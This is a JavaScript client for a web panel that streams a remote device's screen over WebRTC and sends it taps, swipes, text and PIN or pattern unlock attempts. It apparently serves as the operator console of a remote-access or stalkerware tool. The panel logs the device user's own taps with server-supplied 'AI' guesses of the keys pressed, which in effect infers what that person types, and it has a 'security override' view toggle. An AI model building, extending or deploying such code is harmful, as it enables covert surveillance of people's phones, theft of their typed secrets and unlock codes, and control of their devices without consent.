// --- RESCUE CONNECTIVITY CONFIG ---
const socket = io(window.location.origin, {
    transports: ['polling', 'websocket'],
    upgrade: true,
    reconnection: true,
    reconnectionAttempts: Infinity
});

function debugUI(msg, color = "#888") {
    const statusInfo = document.getElementById('status-text');
    if (statusInfo) {
        statusInfo.innerHTML = msg;
        statusInfo.style.color = color;
    }
}

socket.on('connect', () => debugUI("SERVER CONNECTED", "#00ff88"));
socket.on('connect_error', (err) => debugUI(`CONN ERROR`, "#ff4444"));

let peerConnection;
let dataChannel;

const remoteVideo = document.getElementById('remoteVideo');
const remoteVideo2 = document.getElementById('remoteVideo2');
const remoteContainer = document.getElementById('remote-container');
const remoteContainer2 = document.getElementById('remote-container-2');
const drawCanvas = document.getElementById('draw-overlay');
const drawCanvas2 = document.getElementById('draw-overlay-2');
const drawCtx = drawCanvas.getContext('2d');
const drawCtx2 = drawCanvas2.getContext('2d');

const dinoLoader = document.getElementById('dino-loader');
const dinoLoader2 = document.getElementById('dino-loader-2');
const statusDot = document.getElementById('status-dot');
const statusText = document.getElementById('status-text');
const roomIdInput = document.getElementById('roomId');

const pinSimulator = document.getElementById('pin-simulator');
const patternSimulator = document.getElementById('pattern-simulator');
const unlockInput = document.getElementById('unlock-pin');

let isPatternMode = false;
let isPinMode = false;
let patternPoints = [];
const pendingAIGuesses = new Map();

// --- INPUT TRACKING ---
let isMouseDown = false;
let startX, startY, startTime;

function getCoords(e, element) {
    const rect = element.getBoundingClientRect();
    return {
        x: (e.clientX - rect.left) / rect.width,
        y: (e.clientY - rect.top) / rect.height,
        canvasX: e.clientX - rect.left,
        canvasY: e.clientY - rect.top
    };
}

function showRemoteClickIndicator(x, y, label = 'Tap', container = remoteContainer) {
    if (!container) return;
    const indicator = document.createElement('div');
    indicator.className = 'remote-tap-indicator';
    indicator.style.left = `${(x * 100).toFixed(1)}%`;
    indicator.style.top = `${(y * 100).toFixed(1)}%`;
    container.appendChild(indicator);
    setTimeout(() => indicator.remove(), 800);
}

function handleInteractionStart(e, element) {
    if (element.style.display === 'none') return;
    isMouseDown = true;
    const coords = getCoords(e, element);
    startX = coords.x; startY = coords.y; startTime = Date.now();

    if (isPatternMode) {
        patternPoints = [{ x: coords.x, y: coords.y }];
        [drawCtx, drawCtx2].forEach(ctx => {
            ctx.beginPath();
            ctx.lineWidth = 4;
            ctx.strokeStyle = "#00ff88";
            ctx.moveTo(coords.canvasX, coords.canvasY);
        });
    }
}

function handleInteractionMove(e, element) {
    if (!isMouseDown) return;
    const coords = getCoords(e, element);
    if (isPatternMode) {
        patternPoints.push({ x: coords.x, y: coords.y });
        [drawCtx, drawCtx2].forEach(ctx => {
            ctx.lineTo(coords.canvasX, coords.canvasY);
            ctx.stroke();
        });
    }
}

function handleInteractionEnd(e, element) {
    if (!isMouseDown) return;
    isMouseDown = false;
    const coords = getCoords(e, element);
    const duration = Date.now() - startTime;
    const dist = Math.sqrt(Math.pow(coords.x - startX, 2) + Math.pow(coords.y - startY, 2));

    if (dataChannel?.readyState === 'open') {
        if (isPatternMode && patternPoints.length > 5) {
            dataChannel.send(JSON.stringify({ type: 'unlock', points: patternPoints }));
            setTimeout(togglePatternMode, 1000);
        } else if (dist < 0.01) {
            dataChannel.send(JSON.stringify({ type: 'click', x: startX, y: startY, clickId: Date.now() }));
        } else {
            dataChannel.send(JSON.stringify({ type: 'swipe', x1: startX, y1: startY, x2: coords.x, y2: coords.y, duration: Math.max(duration, 100) }));
        }
    }
}

[remoteVideo, remoteVideo2].forEach(el => {
    el.addEventListener('mousedown', (e) => handleInteractionStart(e, el));
    window.addEventListener('mousemove', (e) => handleInteractionMove(e, el));
    window.addEventListener('mouseup', (e) => handleInteractionEnd(e, el));
});

// --- PEER CONNECTION ---
async function createPeerConnection(roomId) {
    if (peerConnection) return;
    const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
    peerConnection = new RTCPeerConnection(config);

    peerConnection.ondatachannel = (event) => {
        dataChannel = event.channel;
        dataChannel.onopen = () => updateStatus("Live Control", true);
        dataChannel.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                if (data.type === 'device_click' || data.type === 'click_feedback') {
                    const rid = roomIdInput.value || localStorage.getItem('lastRoomId');
                    socket.emit("device_click", {
                        roomId: rid, x: data.x, y: data.y,
                        label: data.label || "Device Tap", clickId: data.clickId || Date.now()
                    });
                }
            } catch (e) {}
        };
    };

    peerConnection.ontrack = (event) => {
        const stream = event.streams[0] || new MediaStream([event.track]);
        remoteVideo.srcObject = stream;
        remoteVideo2.srcObject = stream;
        remoteVideo.style.display = 'block';
        remoteVideo2.style.display = 'block';
        dinoLoader.style.display = 'none';
        dinoLoader2.style.display = 'none';
        debugUI("VIDEOS ACTIVE", "#00ff88");
    };

    const offer = await peerConnection.createOffer({ offerToReceiveVideo: true });
    await peerConnection.setLocalDescription(offer);
    socket.emit("message", { roomId, offer });
    peerConnection.onicecandidate = (event) => {
        if (event.candidate) socket.emit("message", { roomId, candidate: event.candidate });
    };
}

// --- UI HELPERS ---
let clickCount = 0;
function displayCoordinates(x, y, source = "Tap", clickId = null, aiGuess = null) {
    const logContent = document.getElementById('click-log-content');
    if (!logContent) return;
    const normalizedClickId = clickId ? String(clickId) : null;
    const pendingAI = normalizedClickId ? pendingAIGuesses.get(normalizedClickId) : null;
    const effectiveAiGuess = aiGuess || pendingAI || '';

    if (normalizedClickId) {
        const existing = logContent.querySelector(`.log-entry[data-click-id="${normalizedClickId}"]`);
        if (existing) {
            const label = effectiveAiGuess ? `${source} (AI: ${effectiveAiGuess})` : source;
            existing.innerHTML = `<span><b>${existing.dataset.order}</b> ${label}:</span><span>${(x*100).toFixed(1)}%, ${(y*100).toFixed(1)}%</span>`;
            if (normalizedClickId && pendingAIGuesses.has(normalizedClickId)) pendingAIGuesses.delete(normalizedClickId);
            return;
        }
    }

    if (clickCount === 0) logContent.innerHTML = '';
    clickCount++;
    const label = effectiveAiGuess ? `${source} (AI: ${effectiveAiGuess})` : source;
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    if (normalizedClickId) { entry.setAttribute('data-click-id', normalizedClickId); entry.dataset.order = getOrdinal(clickCount); }
    entry.innerHTML = `<span><b>${getOrdinal(clickCount)}</b> ${label}:</span><span>${(x*100).toFixed(1)}%, ${(y*100).toFixed(1)}%</span>`;
    logContent.insertBefore(entry, logContent.firstChild);

    showRemoteClickIndicator(x, y, label, remoteContainer);
    showRemoteClickIndicator(x, y, label, remoteContainer2);
}

socket.on("ai_key_guess_broadcast", (data) => {
    const normalizedClickId = data.clickId ? String(data.clickId) : null;
    const logContent = document.getElementById('click-log-content');
    const matchedEntry = normalizedClickId ? logContent.querySelector(`.log-entry[data-click-id="${normalizedClickId}"]`) : null;

    if (matchedEntry) {
        const labelSpan = matchedEntry.querySelector('span:first-child');
        if (!labelSpan.innerHTML.includes('(AI:')) {
            labelSpan.innerHTML += ` <span style="color:#ffaa00; font-size:0.65rem; font-weight:bold;">(AI: ${data.guessed_key})</span>`;
        }
    } else if (normalizedClickId) {
        pendingAIGuesses.set(normalizedClickId, data.guessed_key);
        setTimeout(() => pendingAIGuesses.delete(normalizedClickId), 5000);
    }
});

socket.on('device_click_broadcast', (data) => {
    if (typeof data.x === 'number' && typeof data.y === 'number') {
        displayCoordinates(data.x, data.y, data.label || 'Device Tap', data.clickId);
    }
});

function getOrdinal(n) { const s = ["th", "st", "nd", "rd"], v = n % 100; return n + (s[(v - 20) % 10] || s[v] || s[0]); }

function startSharing() {
    const roomId = roomIdInput.value;
    if (!roomId) return;
    localStorage.setItem('lastRoomId', roomId);
    document.getElementById('setup-screen').style.display = 'none';
    document.getElementById('active-info').style.display = 'block';
    document.getElementById('display-room-id').innerText = roomId;
    dinoLoader.style.display = 'flex';
    dinoLoader2.style.display = 'flex';
    socket.emit("join", roomId);
    updateStatus("Connecting...", false);
    createPeerConnection(roomId);
}

function refreshConnection() {
    const roomId = roomIdInput.value || localStorage.getItem('lastRoomId');
    if (!roomId) return;
    if (peerConnection) peerConnection.close();
    peerConnection = null; dataChannel = null;
    remoteVideo.style.display = 'none'; remoteVideo2.style.display = 'none';
    dinoLoader.style.display = 'flex'; dinoLoader2.style.display = 'flex';
    socket.emit("join", roomId);
    createPeerConnection(roomId);
}

function updateStatus(status, isActive) {
    statusText.innerText = status;
    statusDot.className = 'status-dot' + (isActive ? ' active' : '');
    if (isActive) {
        document.getElementById('remote-controls').style.display = 'flex';
        document.getElementById('active-info').style.display = 'block';
    }
}

function toggleMainPanel() {
    const panel = document.getElementById('main-actions-panel');
    panel.classList.toggle('expanded');
}

function wakeDevice() {
    if (dataChannel?.readyState === 'open') dataChannel.send(JSON.stringify({ type: 'wake' }));
}

function toggleUnlockInput() {
    isPinMode = !isPinMode;
    const btn = document.getElementById('unlock-toggle');
    if (isPinMode) {
        pinSimulator.style.display = 'flex';
        unlockInput.style.display = 'block';
        btn.classList.add('active-mode');
    } else {
        pinSimulator.style.display = 'none';
        unlockInput.style.display = 'none';
        btn.classList.remove('active-mode');
    }
}

function sendUnlock() {
    const pin = unlockInput.value;
    if (pin && dataChannel?.readyState === 'open') {
        dataChannel.send(JSON.stringify({ type: 'unlock', pin: pin }));
        toggleUnlockInput();
        unlockInput.value = "";
    }
}

function togglePatternMode() {
    isPatternMode = !isPatternMode;
    const btn = document.getElementById('pattern-toggle');
    if (isPatternMode) {
        patternSimulator.style.display = 'flex';
        btn.classList.add('active-mode');
        [drawCanvas, drawCanvas2].forEach((cv, i) => {
            const vid = i === 0 ? remoteVideo : remoteVideo2;
            cv.width = vid.clientWidth;
            cv.height = vid.clientHeight;
            const ctx = cv.getContext('2d');
            ctx.clearRect(0, 0, cv.width, cv.height);
        });
    } else {
        patternSimulator.style.display = 'none';
        btn.classList.remove('active-mode');
    }
}

function toggleSecurityOverride() {
    const btn = document.getElementById('security-mode');
    const isAct = btn.classList.toggle('active-mode');
    if (isAct) {
        [remoteVideo, remoteVideo2].forEach(v => { v.style.display = 'block'; v.style.background = '#111'; });
        [dinoLoader, dinoLoader2].forEach(d => d.style.display = 'none');
    }
}

function sendTypeText() {
    const input = document.getElementById('remote-type-input');
    if (input.value && dataChannel?.readyState === 'open') {
        dataChannel.send(JSON.stringify({ type: 'type', text: input.value }));
        input.value = "";
    }
}

function clearClickLog() {
    clickCount = 0;
    document.getElementById('click-log-content').innerHTML = '';
}

socket.on("message", async (data) => {
    if (data.offer) {
        if (!peerConnection) await createPeerConnection(data.roomId);
        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
        const answer = await peerConnection.createAnswer();
        await peerConnection.setLocalDescription(answer);
        socket.emit("message", { roomId: data.roomId, answer });
    } else if (data.answer) {
        if (peerConnection) await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
    } else if (data.candidate && peerConnection) {
        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
    }
});
